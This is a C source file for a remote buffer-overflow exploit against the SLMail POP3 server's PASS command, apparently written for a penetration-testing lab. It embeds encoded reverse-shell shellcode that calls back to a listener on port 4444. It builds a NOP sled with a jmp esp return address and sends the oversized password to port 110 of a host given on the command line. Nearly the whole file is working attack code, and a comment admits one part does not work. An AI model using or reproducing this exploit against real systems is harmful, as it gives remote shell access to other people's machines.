/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

//EVERYTHING works except the moving jmp esp by 1 byte!
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

/*
msfvenom -p windows/shell_reverse_tcp
LHOST=10.11.0.54 LPORT=4444 -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai

Returns a Reverse Shell
*/
unsigned char shellcode[] =
"\xd9\xc2\xd9\x74\x24\xf4\x5f\x29\xc9\xb1\x52\xbe\xa6\x9d\xc8"
"\x0b\x31\x77\x17\x83\xef\xfc\x03\xd1\x8e\x2a\xfe\xe1\x59\x28"
"\x01\x19\x9a\x4d\x8b\xfc\xab\x4d\xef\x75\x9b\x7d\x7b\xdb\x10"
"\xf5\x29\xcf\xa3\x7b\xe6\xe0\x04\x31\xd0\xcf\x95\x6a\x20\x4e"
"\x16\x71\x75\xb0\x27\xba\x88\xb1\x60\xa7\x61\xe3\x39\xa3\xd4"
"\x13\x4d\xf9\xe4\x98\x1d\xef\x6c\x7d\xd5\x0e\x5c\xd0\x6d\x49"
"\x7e\xd3\xa2\xe1\x37\xcb\xa7\xcc\x8e\x60\x13\xba\x10\xa0\x6d"
"\x43\xbe\x8d\x41\xb6\xbe\xca\x66\x29\xb5\x22\x95\xd4\xce\xf1"
"\xe7\x02\x5a\xe1\x40\xc0\xfc\xcd\x71\x05\x9a\x86\x7e\xe2\xe8"
"\xc0\x62\xf5\x3d\x7b\x9e\x7e\xc0\xab\x16\xc4\xe7\x6f\x72\x9e"
"\x86\x36\xde\x71\xb6\x28\x81\x2e\x12\x23\x2c\x3a\x2f\x6e\x39"
"\x8f\x02\x90\xb9\x87\x15\xe3\x8b\x08\x8e\x6b\xa0\xc1\x08\x6c"
"\xc7\xfb\xed\xe2\x36\x04\x0e\x2b\xfd\x50\x5e\x43\xd4\xd8\x35"
"\x93\xd9\x0c\x99\xc3\x75\xff\x5a\xb3\x35\xaf\x32\xd9\xb9\x90"
"\x23\xe2\x13\xb9\xce\x19\xf4\xcc\x05\x21\x32\xb9\x1b\x21\x2b"
"\x65\x95\xc7\x21\x85\xf3\x50\xde\x3c\x5e\x2a\x7f\xc0\x74\x57"
"\xbf\x4a\x7b\xa8\x0e\xbb\xf6\xba\xe7\x4b\x4d\xe0\xae\x54\x7b"
"\x8c\x2d\xc6\xe0\x4c\x3b\xfb\xbe\x1b\x6c\xcd\xb6\xc9\x80\x74"
"\x61\xef\x58\xe0\x4a\xab\x86\xd1\x55\x32\x4a\x6d\x72\x24\x92"
"\x6e\x3e\x10\x4a\x39\xe8\xce\x2c\x93\x5a\xb8\xe6\x48\x35\x2c"
"\x7e\xa3\x86\x2a\x7f\xee\x70\xd2\xce\x47\xc5\xed\xff\x0f\xc1"
"\x96\x1d\xb0\x2e\x4d\xa6\xc0\x64\xcf\x8f\x48\x21\x9a\x8d\x14"
"\xd2\x71\xd1\x20\x51\x73\xaa\xd6\x49\xf6\xaf\x93\xcd\xeb\xdd"
"\x8c\xbb\x0b\x71\xac\xe9";

void exploit(int sock) {
      FILE *test;
      int *ptr;  // This is an unitialized (emtpy) pointer that returns addys
      char userbuf[] = "USER madivan\r\n";
      char evil[3101]; //Allocate 3101 bytes of stack mem for an array
      char buf[3012]; // ALlocate 3012 bytes of stack mem for an array
      char receive[1024]; // Allocate 1024 bytes of stack mem for recv
      char nopsled[] = "\x90\x90\x8f\x35\x4a\x5f\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
                       //Array with NOP and jmp esp address
      memset(buf, 0x00, 3012);// zero out buffer at addy of array buf[]
      memset(evil, 0x00, 3101);// zero out buffer at addy of array evil[]
      memset(evil, 0x43, 3100);// Fills evil buffer with 3100 "C"s
      ptr = &evil; // Puts info into empty ptr: addy of evil[]
      ptr = ptr + 651; //adjusts ptr to 652nd "word" of evil array (buffer)
      //word is 4 bytes: 651 X 4 = 2604
      // 2604 OK b/c we write 2 NOP  to get us to EIP, then the jmp esp address

      memcpy(ptr, &nopsled, 16); //copies NOPs + jmp esp + more NOPs
      ptr = ptr + 4;
      memcpy(ptr, &shellcode, 355);//copies shellcode to addy at ptr

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
